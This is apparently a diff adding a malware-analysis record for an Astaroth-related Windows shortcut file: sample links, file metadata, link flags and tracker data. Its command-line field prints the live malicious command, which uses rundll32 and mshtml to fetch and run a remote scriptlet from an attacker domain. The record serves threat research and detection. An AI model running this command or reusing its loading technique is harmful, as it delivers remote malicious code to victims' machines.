@@ -1,0 +1,41 @@
+LNK file associated with Astaroth
+https://www.cybereason.com/blog/information-stealing-malware-targeting-brazil-full-research
+
+Astaroth LNK:
+https://www.virustotal.com/gui/file/3a6c84b00170aea3028dcf9fbdeaaa5141468874573ce6797a1eba0025aad62f/details
+https://hybrid-analysis.com/sample/3a6c84b00170aea3028dcf9fbdeaaa5141468874573ce6797a1eba0025aad62f?environmentId=100
+
+Metadata:
+guid               {00021401-0000-0000-c000-000000000046}
+mtime              Sat Jul 16 11:42:42 2016 Z
+atime              Sat Jul 16 11:42:42 2016 Z
+ctime              Sat Jul 16 11:42:42 2016 Z
+basepath           C:\Windows\System32\rundll32.exe
+shitemidlist       My Computer/C:\/Windows/System32/rundll32.exe
+**Shell Items Details (times in UTC)**
+  C:2016-07-16 06:04:26  M:2017-04-06 19:20:00  A:2017-04-06 19:20:00 Windows (9)
+  C:2016-07-16 06:04:26  M:2017-04-06 23:52:58  A:2017-04-06 23:52:58 System32 (9)
+  C:2016-07-16 11:42:44  M:2016-07-16 11:42:44  A:2016-07-16 11:42:44 rundll32.exe (9)
+vol_sn             ECCD-85F4                     
+vol_type           Fixed Disk                    
+commandline        javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://hardx.thaieasydns.com/01/Seu7.sct");
+iconfilename       %SystemRoot%\system32\imageres.dll
+hotkey             0x244                           
+showcmd            0x1                             
+
+***LinkFlags***
+HasLinkTargetIDList|IsUnicode|HasLinkInfo|HasArguments|HasIconLocation|HasRelativePath
+
+
+***KnownFolderDataBlock***
+GUID  : {1ac14e77-02e7-4e5d-b744-2eb1ae5198b7}
+Folder: CSIDL_SYSTEM
+
+***TrackerDataBlock***
+Machine ID            : ideia           
+New Droid ID Time     : Thu Apr  6 19:51:48 2017 UTC
+New Droid ID Seq Num  : 8849
+New Droid    Node ID  : 82:c2:28:09:30:bb
+Birth Droid ID Time   : Thu Apr  6 19:51:48 2017 UTC
+Birth Droid ID Seq Num: 8849
+Birth Droid Node ID   : 82:c2:28:09:30:bb
